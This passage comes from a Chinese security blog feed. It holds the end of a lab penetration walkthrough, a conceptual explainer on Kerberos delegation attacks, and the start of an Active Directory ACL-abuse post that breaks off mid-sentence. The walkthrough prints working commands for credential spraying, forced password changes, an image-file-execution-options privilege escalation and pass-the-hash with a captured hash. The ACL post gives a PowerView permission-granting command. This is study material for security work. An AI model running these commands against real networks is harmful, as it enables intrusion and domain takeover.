___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.3</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 172.22.8.18     is alive</span><br><span class="line">(icmp) Target 172.22.8.15     is alive</span><br><span class="line">(icmp) Target 172.22.8.31     is alive</span><br><span class="line">(icmp) Target 172.22.8.46     is alive</span><br><span class="line">[*] Icmp alive hosts len is: 4</span><br><span class="line">172.22.8.15:88 open</span><br><span class="line">172.22.8.46:445 open</span><br><span class="line">172.22.8.18:1433 open</span><br><span class="line">172.22.8.31:445 open</span><br><span class="line">172.22.8.15:445 open</span><br><span class="line">172.22.8.18:445 open</span><br><span class="line">172.22.8.46:139 open</span><br><span class="line">172.22.8.31:139 open</span><br><span class="line">172.22.8.15:139 open</span><br><span class="line">172.22.8.46:135 open</span><br><span class="line">172.22.8.18:139 open</span><br><span class="line">172.22.8.31:135 open</span><br><span class="line">172.22.8.15:135 open</span><br><span class="line">172.22.8.18:135 open</span><br><span class="line">172.22.8.46:80 open</span><br><span class="line">172.22.8.18:80 open</span><br><span class="line">[*] alive ports len is: 16</span><br><span class="line">start vulscan</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.46</span><br><span class="line">   [-&gt;]WIN2016</span><br><span class="line">   [-&gt;]172.22.8.46</span><br><span class="line">[*] WebTitle http://172.22.8.18        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.15</span><br><span class="line">   [-&gt;]DC01</span><br><span class="line">   [-&gt;]172.22.8.15</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.31</span><br><span class="line">   [-&gt;]WIN19-CLIENT</span><br><span class="line">   [-&gt;]172.22.8.31</span><br><span class="line">[*] NetInfo </span><br><span class="line">[*]172.22.8.18</span><br><span class="line">   [-&gt;]WIN-WEB</span><br><span class="line">   [-&gt;]172.22.8.18</span><br><span class="line">   [-&gt;]2001:0:348b:fb58:30f1:35e1:d89c:71e5</span><br><span class="line">[*] NetBios 172.22.8.31     XIAORANG\WIN19-CLIENT         </span><br><span class="line">[*] NetBios 172.22.8.15     [+] DC:XIAORANG\DC01           </span><br><span class="line">[*] NetBios 172.22.8.46     WIN2016.xiaorang.lab                Windows Server 2016 Datacenter 14393</span><br><span class="line">[*] WebTitle http://172.22.8.46        code:200 len:703    title:IIS Windows Server</span><br><span class="line">[+] mssql 172.22.8.18:1433:sa 1qaz!QAZ</span><br></pre></td></tr></table></figure><img src="/post/72d64c19/IMAGE20250307191238337.png" class=""><p>发现有一个John用户，看看其在不在线。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell quser || qwinst</span><br></pre></td></tr></table></figure><img src="/post/72d64c19/IMAGE20250307191345780.png" class=""><p>发现是在线的。注入一下其进程</p><img src="/post/72d64c19/IMAGE20250307192030915.png" class=""><p>发现存在一个网络连接，读取一下其中的内容。</p><img src="/post/72d64c19/IMAGE20250307192316223.png" class=""><p>得到了一个用户名和密码，并且提示了一个 映像劫持，先记下来后面要用。</p><p>那我们拿着这个用户名和密码去遍历下看看谁能登录，先搭建个socks5代理方便后续渗透。</p><p><code>crackmapexec smb 172.22.8.0/24 -u 'Aldrich' -p 'Ald@rLMWuy7Z!#'</code></p><p>但是都不行，考虑用kali的rdesktop(因为可以更改密码)远程登录试试一个个尝试，最后发现172.22.8.46可以登录，但是要改一下密码。这里其实也可以参考其他师傅的思路就是用impacket 工具包更改下密码就行</p><p><code>python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'password'</code></p><p>之后换一个rdp工具kali有点ka也不知道为啥。</p><h2 id="映像劫持">映像劫持</h2><img src="/post/72d64c19/IMAGE20250307195246344.png" class=""><p>根据之前的提示有个映像劫持提权，咱们还是用cs学习他，因为这台机器不出网，但是在内网可以，所以就利用cs派生一个监听端口然后生成木马让其连接。</p><p>先查看下权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">get-acl -path &quot;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; | fl *</span><br></pre></td></tr></table></figure><img src="/post/72d64c19/IMAGE20250307200844510.png" class=""><p>这里我们发现所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，使用放大镜进行提权，其实也就是把本来用户主页点放大镜启动的magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure><p>然后我们锁屏点击放大镜</p><img src="/post/72d64c19/IMAGE20250307201117575.png" class=""><img src="/post/72d64c19/IMAGE20250307201144831.png" class=""><p>提权成功，在从新运行下我们的马。</p><img src="/post/72d64c19/IMAGE20250307201517414.png" class=""><p>此时去获取第二个flag</p><img src="/post/72d64c19/IMAGE20250307201553386.png" class=""><p>接下来继续在收集信息</p><img src="/post/72d64c19/IMAGE20250307201735844.png" class=""><p>发现该机器账户在域管理员组里，那么我们就dump下hash</p><img src="/post/72d64c19/IMAGE20250307201943209.png" class=""><p>然后打一下pth直接拿下第三个flag</p><p><code>proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H ffcdf594beeada0076fc2263cd7947f7 -d xiaorang -x &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</code></p><img src="/post/72d64c19/IMAGE20250307205435555.png" class="">]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;信息收集&quot;&gt;信息收集&lt;/h2&gt;
&lt;p&gt;先用fscan扫描一下看看有啥东西吗&lt;/p&gt;
&lt;img src=&quot;/post/72d64c19/IMAGE20250307185902774.png&quot; class=&quot;&quot;&gt;
&lt;h2 id=&quot;数据库提权&quot;&gt;数据库提权&lt;/h2&gt;
&lt;</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="内网渗透" scheme="https://oceanzbz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    <category term="春秋云镜" scheme="https://oceanzbz.github.io/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>委派攻击原理</title>
    <link href="https://oceanzbz.github.io/post/95be0397.html"/>
    <id>https://oceanzbz.github.io/post/95be0397.html</id>
    <published>2025-03-05T12:32:44.000Z</published>
    <updated>2025-03-06T03:05:19.726Z</updated>
    
    <content type="html"><![CDATA[<p>之前看过好多委派攻击的原理说明还都是很迷糊不明白，最近打了几个靶场慢慢能稍微理解一下。<br>也来记录下网上师傅写的原理</p><h2 id="委派">委派</h2><p>先来说一下什么是委派：<strong>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以用户权限访问域内的其他服务。</strong></p><h2 id="为什么要域委派">为什么要域委派</h2><p>这里引用别的师傅的表述：</p><p>比如现在有web服务器和文件服务器，当用户A访问web服务器去请求某个资源时，web服务器上本身并没有该资源，所以web服务器就会从文件服务器上调用这个资源，其中发生的过程若以域委派的形式进行，那么就是：用户A访问web服务器，服务器再以用户A的身份去访问文件服务器。</p><h2 id="可以进行域委派的用户">可以进行域委派的用户</h2><p>一种是主机账户，活动目录中的computers组内的计算机，也被称为机器账号。如下图:</p><img src="/post/95be0397/IMAGE20250305213352906.png" class=""><p>另一种是用<strong>setspn</strong>手动添加的<strong>服务账户</strong>。简单来说,服务账号，域内用户的一种类型，服务器运行服务时所用的账号，将服务运行起来并加入域。例如MS SQL Server在安装时，会在域内自动注册服务账号SqlServiceAccount，这类账号不能用于交互式登录，也就是说无法通过SqlServiceAccount来通过3389进行rdp登录。</p><p>看一下具体的域委派的流程，参考域渗透攻防指南</p><img src="/post/95be0397/IMAGE20250305213546567.png" class=""><p>域用户 xie\test 以 Kerberos 身份验证访问 Web 服务器，请求下载文件。但是真正的文件在后台的文件服务器上。于是，Web 服务器的服务账号 websrv 模拟域用户 xie\test，以 Kerberos 协议继续认证到后台文件服务器。后台文件服务器将文件返回给 Web 服务器，Web 服务器再将文件返回给域用户 xie\test 。这样，就完成了一个委派的流程。</p><h2 id="委派的分类">委派的分类</h2><ul><li>非约束委派(Unconstrained Delegation, UD)</li><li>约束委派(Constrained Delegation, CD)</li><li>基于资源的约束委派(Resource Based Constrained Delegation, RBCD)</li></ul><h2 id="非约束委派">非约束委派</h2><p>先来看一下非约束委派的流程</p><img src="/post/95be0397/IMAGE20250305215301171.png" class=""><p>具体流程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">（1）用户通过发送一个 KRB_AS_REQ 消息，向 KDC 密钥分发中心 KDC 的 AS认证服务进行身份验证，请求一个可转发的 TGT1 认购权证。</span><br><span class="line">（2）KDC 在 KRB_AS_REP 消息中返回了一个可转发的 TGT1 认购权证。</span><br><span class="line">（3）用户根据上一步获取到的可转发的 TGT1 认购权证请求另一个可转发的TGT2 认购权证，这一步是通过 KRB_TGS_REQ 消息请求。</span><br><span class="line">（4）KDC 在 KRB_TGS_REP 消息中为用户返回可转发的 TGT2 认购权证。</span><br><span class="line">（5）用户使用步骤 2 中返回的 TGT1 认购权证向 KDC 请求 Service1 的 ST 服务票据。</span><br><span class="line">（6）KDC 的 TGS 服务在 KRB_TGS_REP 消息中返回给用户 Service1 的 ST 服务票据。</span><br><span class="line">（7）用户发送 KRB_AP_REQ 消息请求 Service1，KRB_AP_REQ 消息中包含了TGT1 认购权证和 Service1 的 ST 服务票据、TGT2 认购权证、TGT2 认购权证的SessionKey。</span><br><span class="line">（8）service1 以用户的名义向 KDC 的 TGS 服务发送 KRB_TGS_REQ 请求，请求 Service2 的 ST 服务票据。请求中包含用户发过来的 TGT2 认购权证。</span><br><span class="line">（9）KDC 的 TGS 服务在 KRB_TGS_REP 消息中返回 Service2 的 ST 服务票据给 Service1，以及 service1 可以使用的 sessionkey。ST 服务票据将客户端标识为用户，而不是 Service1。</span><br><span class="line">（10）Service1 以用户的名义向 Service2 发起 KRB_AP_REQ 请求。</span><br><span class="line">（11）Service2 响应 service1 的 KRB_AP_REQ 请求。</span><br><span class="line">（12）有了步骤 11 这个响应，Service1 就可以响应步骤 7 中用户的KRB_AP_REQ 请求。</span><br><span class="line">（13）这里的 TGT 认购权证转发委派机制没有限制 Service1 使用 TGT2 认购权证来申请哪个服务，所以 Service1 可以以用户的名义向 KDC 申请任何其他服务的ST 服务票据。</span><br><span class="line">（14）KDC 返回步骤 13 中请求的 ST 服务票据。</span><br><span class="line">（15）Service1 以用户的名义来请求其它 service N 服务。</span><br><span class="line">（16）Service N 服务将响应用户的请求一样响应 Service1。</span><br><span class="line">在该流程中，TGT1 认购权证请求的 ST 服务票据用于访问 service1 服务，TGT2认购权证请求的 ST 服务票据用于访问 service2 服务</span><br></pre></td></tr></table></figure><p>用大佬总结的原理就是用户B想访问服务A，于是向KDC提交认证，KDC发现A是非约束性委派，会把TGT放在ST中一并给用户B。然后用户B用这个ST去访问服务A，服务A就相当于获得了用户B的TGT，把TGT放入<strong>lsass</strong>进程，然后就可以拿着用户B的TGT以用户B的身份去访问该用户权限能够访问的服务了。所以其实在我们攻击者的视角来看的话就是如果控制了一台配置了非约束委派的机器，就可以诱骗其他用户来访问这台机器来获得他们的TGT。</p><p>具体利用方式有三种参考以下文章<br><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a></p><h2 id="约束委派">约束委派</h2><p>为了在 Kerberos 协议层面对约束性委派的支持，微软对 Kerberos 协议扩展了两个子协议 S4u2self(Service for User to Self) 和 S4u2Proxy (Service for User to Proxy )。S4u2self 可以代表任意用户请求针对自身的 ST 服务票据；S4u2Proxy 可以用上一步获得的 ST 服务票据以用户的名义请求针对其它指定服务的 ST 服务票据。</p><p>还是同样的先来看看流程</p><img src="/post/95be0397/IMAGE20250305224818566.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（1）用户向 Service1 发出请求，用户已通过身份验证，但 Service1 没有用户的授权数据，这通常是由于用户的身份验证是通过 Kerberos 以外(基于表单的 web 认证、NTLM 认证等)的其他方式验证的。</span><br><span class="line">（2）Service1 已经通过 KDC 进行了身份验证，并获得了 TGT 认购权证。它通过S4U2self 协议代表用户向 KDC 请求一张访问自身 Service1 服务的可转发 ST 服务票据。</span><br><span class="line">（3）KDC 返回给 Service1 一张访问 Service1 自身服务的可转发 ST1 服务票据，就像是用户使用自己的 TGT 认购权证请求的一样，该可转发的 ST1 服务票据可能包含用户的授权数据。</span><br><span class="line">（4）Service1 可以使用 ST1 服务票据中的授权数据来满足用户的请求，然后响应用户。</span><br><span class="line">（5）用户向 Service1 发出请求，请求访问 Service2 上的资源。</span><br><span class="line">（6）Service1 利用 S4U4Proxy 协议以用户的名义向 KDC 请求访问 Service2 的ST2 服务票据，该请求中带上了可转发的 ST1 服务票据</span><br><span class="line">（7）如果请求中存在 PAC 特权属性证书，则 KDC 通过检查 PAC 结构的签名数据来验证 PAC。如果 PAC 有效或不存在，KDC 返回 Service2 的可转发 ST2 服务票据，并且存储在 ST2 服务票据中的 cname 和 crealm 字段中的客户端标识是用户，而不是 Service1。</span><br><span class="line">（8）Service1 以用户身份使用可转发 ST2 服务票据向 Service2 发起请求。</span><br><span class="line">（9）Service2 响应步骤 8 的请求。</span><br><span class="line">（10）Service1 响应用户对步骤 5 中的请求。</span><br></pre></td></tr></table></figure><p>还是记录下大佬的总结<br>由于服务用户只能获取某个用户（或主机）的服务的ST1而非TGT ， 所以只能模拟用户访问特定的服务 ；但是如果能够拿到约束委派用户（或主机）的明文密码或hash，那么就可以伪造S4U的请求，伪装成服务用户以任意用户的权限申请访问指定服务的ST2。</p><p>具体利用还是参考上面的链接。</p><h2 id="基于资源的约束性委派">基于资源的约束性委派</h2><p>看下流程图：</p><img src="/post/95be0397/IMAGE20250306105542558.png" class=""><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">①：服务 A 使用自己的服务账号密码向 KDC 申请一个可转发的 TGT 认购权证。</span><br><span class="line">②：服务 A 利用 S4U2Self 协议代表用户申请一个获得针对服务 A 自身的 ST 服务票据。这一步区别于传统的约束性委派。在 S4U2Self 协议里面提到，返回的 ST服务票据可转发的一个条件是服务 A 配置了传统的约束委派。KDC 会检查服务 A的 msDS-AllowedToDelegateTo 字段，如果这个字段赋值了，则 KDC 返回可转发的 ST 服务票据。但是由于这里是基于资源的约束性委派，是在服务 B 上配置的，服务 B 的 msDS-AllowedToActOnBehalfOfOtherIdentity 属性配置了服务 A的 SID，因此服务 A 并没有配置 msDS-AllowedToDelegateTo 字段。因此 KDC返回的 ST 服务票据是不可转发的。</span><br><span class="line">③：服务 A 利用 S4U2Proxy 协议以用户的身份向 KDC 请求访问针对服务 B 的可转发的 ST 服务票据(上一步获得的不可转发的 ST 服务票据放在请求包的AddtionTicket 里面)。KDC 返回一张访问服务 B 的可转发的 ST 服务票据。</span><br><span class="line">④：服务 A 拿着上一步获得的可转发的 ST 服务票据访问服务 B。</span><br></pre></td></tr></table></figure><h3 id="原理">原理</h3><p>在windows server 2012开始加入了新功能（基于资源的约束性委派RBCD），而且不需要域管理员去设置相关属性，RBCD把设置委派的权限赋予了机器自身，机器自己可以决定谁可以被委派来控制我，也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD，简单来说就是如果我们拥有了配置某台机器msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限，那么我们就对这台机器拥有完全控制的权限，以下这些拥有配置msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.将某机器加入域的域用户</span><br><span class="line">2.机器自身</span><br><span class="line">3.域管理员</span><br></pre></td></tr></table></figure><p>我们可以利用域用户添加一个机器账户作为服务1，注意是机器账户，不是普通账户，普通账户没有SPN，因为S4U2self协议会用到SPN，而且通过S4U2Self得到的ST服务票证是不可被转发的，而S4U2Proxy的作用就是将可转发的ST票据转发到其他服务进行委派认证的，但是在基于资源的约束委派过程中，不可转发的ST仍可以通过S4U2Proxy转发到其他服务进行委派认证，并且最后还会返回一张可转发的ST服务票证，如果我们可以在服务2上配置允许服务1的资源约束委派，就可以通过服务1利用S4U2self向KDC请求用于访问自身的票据，在使用S4U2Proxy转发此票据去请求访问服务2的票据，最终就可以模拟任何用户去访问服务2了</p><h3 id="攻击条件">攻击条件</h3><p>1.机器账户：是由某个域用户创建的主机，只要拿下这个域账户，那么就能拿下这个域用户所创建的所有机器账户的最高权限（默认每个域用户能创10个机器账户）</p><p>2.拥有一个有权修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的域用户账号密码(将机器拉进域的域用户)、或者在account operators组内的域用户</p><p>3.域控需要是server2012和2012 R2以上的（因为2008及以下没有msDS-AllowedToActOnBehalfOfOtherIdentity属性）</p><p>4.任意用户对该主机的属性具有写权限，那么这个用户就可以对该主机进行攻击，所以可以枚举域内ACL策略，查看哪些对主机有GenericAll权限，GenericWrite、WriteProperty、WriteDacl等等权限，都是可以的</p><p>来一个攻击图</p><img src="/post/95be0397/IMAGE20250305233206701.png" class=""><p>具体利用方式还是参考第一个链接。</p><h3 id="约束委派和基于资源的约束委派区别：">约束委派和基于资源的约束委派区别：</h3><p>传统的约束性委派是“正向的”，通过修改服务账户 A 的”msDS-AllowedToDelegateTo”属性，添加服务 B 的 SPN（Service Principle Name），设置约束委派对象为服务 B，服务 A 便可以模拟任意用户向域控制器请求访问服务 B 的 ST 服务票据。</p><p>基于资源的约束性委派则是相反，通过修改服务 B 的”msDS-  AllowedToActOnBehalfOfOtherIdentity”属性，添加服务 A 的 SID，达到让服务 A 模拟任意用户访问服务 B 资源的目的。</p><p>如图所示</p><img src="/post/95be0397/IMAGE20250306110134517.png" class=""><p>参考文章：<br><a href="https://mp.weixin.qq.com/s/LXeFNmHaAwi3fnZ3AJaFiQ">https://mp.weixin.qq.com/s/LXeFNmHaAwi3fnZ3AJaFiQ</a><br><a href="https://mp.weixin.qq.com/s/mALL2koAmEONSsrSudaAdA">https://mp.weixin.qq.com/s/mALL2koAmEONSsrSudaAdA</a><br><a href="https://forum.butian.net/share/1591">https://forum.butian.net/share/1591</a><br>谢公子域渗透攻防指南</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前看过好多委派攻击的原理说明还都是很迷糊不明白，最近打了几个靶场慢慢能稍微理解一下。&lt;br&gt;
也来记录下网上师傅写的原理&lt;/p&gt;
&lt;h2 id=&quot;委派&quot;&gt;委派&lt;/h2&gt;
&lt;p&gt;先来说一下什么是委派：&lt;strong&gt;域委派是指将域内用户的权限委派给服务账号，使得服务账号能以</summary>
      
    
    
    
    <category term="攻防渗透" scheme="https://oceanzbz.github.io/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/"/>
    
    
    <category term="windows" scheme="https://oceanzbz.github.io/tags/windows/"/>
    
    <category term="域渗透" scheme="https://oceanzbz.github.io/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>ACL攻防</title>
    <link href="https://oceanzbz.github.io/post/1f7550a0.html"/>
    <id>https://oceanzbz.github.io/post/1f7550a0.html</id>
    <published>2025-03-03T15:14:03.000Z</published>
    <updated>2025-03-05T07:24:36.813Z</updated>
    
    <content type="html"><![CDATA[<p>该篇文章主要转自<br><a href="https://www.anquanke.com/post/id/212163">https://www.anquanke.com/post/id/212163</a> 详细请参考原文，本文只是方便自己查资料</p><h2 id="ACL的概念">ACL的概念</h2><h3 id="安全主体">安全主体</h3><p>我们先来看看什么是安全主体 Security Principals。安全主体是可以通过系统进行身份验证的任何实体，例如用户帐户、计算机帐户，或在用户或计算机帐户的安全上下文中运行的线程或进程，以及这些帐户的安全组。每个安全主体在创建时都会自动分配一个安全标识符(SID)。安全主体是控制对安全资源的访问的基础。在活动目录域中创建的安全主体是活动目录对象，可用于管理对域资源的访问。</p><h3 id="安全标识符SID">安全标识符SID</h3><p>安全标识符(Security Identifiers，SID)用于唯一标识安全主体或安全组。在帐户的安全上下文中运行的每个帐户、组或进程都有一个唯一的SID，它由当局发布，例如Windows域控制器。它被存储在一个安全数据库中。系统将生成在创建该帐户或组时标识该特定帐户或组的SID。当SID被用作用户或组的唯一标识符时，它再也不能被用于标识其他用户或组。除了分配给特定用户和组唯一创建的、特定于领域的SID外，还有一些众所周知的SID可以识别通用组和通用用户的SID。众所周知的SID在所有操作系统中都保持不变。SID是Windows安全模型的一个基本构建模块，它与Windows服务器操作系统的安全基础设施中的授权和访问控制技术的特定组件一起工作。这有助于保护对网络资源的访问，并提供了一个更安全的计算环境。</p><p>一些常见用户的SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">administrator：S-1-5--500</span><br><span class="line">Guest：S-1-5--501</span><br><span class="line">KRBTGT：S-1-5--502</span><br></pre></td></tr></table></figure><p>一些常见的组SID</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Guests：S-1-5-32-546</span><br><span class="line">Account Operators：S-1-5-32-548</span><br><span class="line">Server Operators：S-1-5-32-549</span><br><span class="line">Print Operators：S-1-5-32-550</span><br><span class="line">Backup Operators：S-1-5-32-551 </span><br><span class="line">Domain Admins：S-1-5--512</span><br><span class="line">Domain Users：S-1-5--513</span><br><span class="line">Domain Guests：S-1-5--514</span><br><span class="line">Domain Computers：S-1-5--515</span><br><span class="line">Domain Controllers：S-1-5--516</span><br><span class="line">Cert Publishers：S-1-5--517</span><br><span class="line">Schema Admins：S-1-5--518</span><br><span class="line">Enterprise Admins：S-1-5--519</span><br><span class="line">Group Policy Creators Owners：S-1-5--520</span><br><span class="line">RAS and IAS Servers：S-1-5--553</span><br><span class="line">Pre–Windows 2000 Compatible Access：S-1-5-32-554</span><br></pre></td></tr></table></figure><h3 id="windows访问控制模型">windows访问控制模型</h3><p>访问控制(AC，Access Control)是指控制谁(安全主体，Security Principals)可以访问操作系统中的资源(被访问实体)，这里的访问不仅仅是单纯的访问，而是包括增删改查等操作。这里的安全主体可以是用户、进程等，而被访问实体可能是文件、服务、活动目录对象等资源。系统是如何判断安全主体是否对被访问实体具有fcmit.cc权限，并且具有哪些权限呢？这就涉及到 Windows 的访问控制模型(ACM，Access Control Model)了。Windows 的访问控制模型由访问令牌(Access Token)和安全描述符(Security Descriptors)两部分组成。</p><p>用一个比喻来说更好理解引用自大佬的总结<br>就是一个判断你在一个档案馆（在这里可以理解为整个域）里是否有权限打开某个档案抽屉（用户对象、用户组对象、Computer对象），并且是否能在这个档案抽屉中取走、存放、修改档案（读、写、修改）的一个模型。</p><img src="/post/1f7550a0/IMAGE20250303232659848.png" class=""><h4 id="访问令牌-Access-Token">访问令牌(Access Token)</h4><p>用户登录系统时，系统会对用户的帐户名和密码进行身份验证。如果登录成功，系统将创建访问令牌。 此后，代表此用户执行的每一个进程都有此访问令牌的副本， 访问令牌是描述进程或线程安全上下文的对象。访问令牌包含用户的 SID、用户权限和用户所属的任何组的 SID，还包含用户或用户组拥有的权限列表。 当进程尝试访问安全对象或执行需要特权的系统管理任务时，系统使用此访问令牌来标识关联的用户。</p><p>访问令牌包含以下信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">• 用户帐户安全标识符 SID</span><br><span class="line">• 用户所属组的 SID</span><br><span class="line">• 标识当前登录会话的登录 SID</span><br><span class="line">• 用户或 用户组拥有的权限列表</span><br><span class="line">• 所有者 SID</span><br><span class="line">• 主组的 SID</span><br><span class="line">• 用户创建安全对象而不指定安全描述符时系统使用的默认 DACL</span><br><span class="line">• 访问令牌的源</span><br><span class="line">• 令牌是主令牌还是模拟令牌</span><br><span class="line">• 限制 SID 的可选列表</span><br><span class="line">• 当前模拟级别</span><br><span class="line">• 其他统计信息</span><br></pre></td></tr></table></figure><p>每个进程都有一个主令牌，用于描述与进程关联的用户帐户的安全上下文。 默认情况下，当进程的线程与安全对象交互时，系统将使用主令牌。 此外，线程可以模拟客户端帐户，模拟允许线程使用客户端的安全上下文与安全对象进行交互，模拟客户端的线程同时具有主令牌和模拟令牌。</p><h4 id="安全描述符">安全描述符</h4><p>SID（Security Identifiers）即安全描述符。<br>安全描述符标识对象的所有者，并包含以下访问控制列表：<br>1、Discretionary Access Control List (DACL) 自由访问控制列表<br>2、System Access Control List (SACL) 系统访问控制列表<br>每一种控制列表中都存在若干条ACE（Access Control Entries）</p><img src="/post/1f7550a0/IMAGE20250303233513292.png" class=""><p>用一个图来说明下什么是安全描述符</p><img src="/post/1f7550a0/IMAGE20250303233621067.png" class=""><h5 id="DACL">DACL</h5><p>高级安全设置中的权限就是DACL的列表</p><img src="/post/1f7550a0/IMAGE20250303233652144.png" class=""><h5 id="SACL">SACL</h5><p>高级安全设置中的审核就是SACL的列表</p><img src="/post/1f7550a0/IMAGE20250303233712647.png" class=""><p>其中红色圈出来的每一条都是一条ACE</p><h5 id="ACE">ACE</h5><p>ACE是针对特定用户或特定组的单个权限授予（或拒绝权利）的配置结构。ACE有许多不同类型，但是在Active Directory的权限中，只有四种不同的含义，两种分别用于授予和拒绝权限。</p><h6 id="Access-Mask">Access Mask</h6><p>在ACE中有Access Mask这个字段，它代表着此条ACE所对应的权限，比如完全控制（GenericAll）、修改密码（ResetPassword）、写入属性（WriteMembers）等等。</p><img src="/post/1f7550a0/IMAGE20250303234108572.png" class=""><h6 id="Trustees">Trustees</h6><p>Trustees的意思为受委托人，受托者是一个ACE所应用到的用户账户，组账户或者是登录会话。也就是说，谁是某一个ACE的受托者，那么这条ACE中的Access Mask所对应的权限（可能是拒绝可能是通过）就会赋予受托者。比如下面这一条的受委托人实际上就是zhangs账号。</p><img src="/post/1f7550a0/IMAGE20250303234218089.png" class=""><h2 id="域中常见的ACL滥用">域中常见的ACL滥用</h2><p>（1）属性权限</p><ul><li>member：拥有该属性的权限，可以将任意用户、组或机器加入到目标安全组中。</li><li>msDS-AllowedToActOnBehalfOfOtherIdentity:拥有该属性的权限，可以修改目标对象基于资源的约束性委派RBCD，进行攻击目标的权限。<br>（2）扩展权限</li><li>DCSync:拥有扩展权限，可以通过目录复制服务（Directory Replication Service,DRS）的  GetNCChanges接口向域控发起数据同步请求，从而获得域内任意用户的密码 Hash。</li><li>User-Force-Change-Password：拥有的该扩展权限，可以在不知道目标用户密码的情况下强制修改目标用户的密码。<br>（3）基本权限</li><li>GenericWrite：拥有该权限，可以修改目标安全对象的所有参数，包括对所有属性的修改。</li><li>GenericAll：拥有该权限就等于拥有了对目标安全对象的完整控制权。</li><li>WriteOwner：拥有该权限，可以修改目标安全对象的Owner属性为自身，从而安全控制该安全对象。</li><li>WriteDACL：拥有该权限，可以往目标安全对象写入任何的ACE，从而完全控制该安全对象。</li></ul><h3 id="GenericAll">GenericAll</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Add-DomainObjectAcl -TargetIdentity testuser -PrincipalIdentity test2user -Rights All</span><br><span class="line"> -Verbose</span><br></pre></td></tr></table></figure> <img src="/post/1f7550a0/IMAGE20250304115252744.png" class=""><p>给予了test2user对testuser用户完全控制的权限，在查看testuser的时候可以发现test2user的SID在查询里出现</p><img src="/post/1f7550a0/IMAGE20250304115317875.png" class=""><img src="/post/1f7550a0/IMAGE20250304115325857.png" class=""><p>也可以对一个组进行设置</p><p>powerview将yayi用户添加到domain 